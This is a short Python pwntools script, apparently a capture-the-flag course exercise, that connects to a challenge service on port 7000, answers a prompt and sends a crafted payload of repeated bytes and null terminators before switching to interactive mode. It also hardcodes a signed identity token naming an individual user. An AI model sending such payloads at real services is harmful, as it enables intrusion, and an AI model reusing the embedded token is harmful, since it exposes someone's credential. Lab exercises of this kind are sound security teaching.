from pwnlib import *

from ctf_helper import *
from utils import find_animal, animal_switch


id_token = "eyJhbGciOiJFZERTQSIsImtpZCI6ImlkIiwidHlwIjoiSldUIn0.eyJzdWIiOiJUaG9tYXMuQmFydGgiLCJpc3MiOiJodHRwczovL2luZjIyNi5wdWZmbGluZy5ubyIsImlhdCI6MTc1OTEzMzcwMCwic2NvcGUiOlsiaWQiXX0.ogTDQS92Ul2wctc2BY-pjcnq8V6uKPo2nhpvDZYLuHfUtQYcAZvbJT00jzV03oJHpVRXm31qMUdvtJ-05733BQ"  # insert your token here

io: tube = start(7000)

read_welcome(id_token)

# REPLACE WITH YOUR CODE
io.sendline(b"y")
io.recvuntil(b"?")
io.sendline((b"w" * 15 + b"\0") * 2)


io.interactive()
# May help you decode the final success/fail response
log_answer(read_answer())
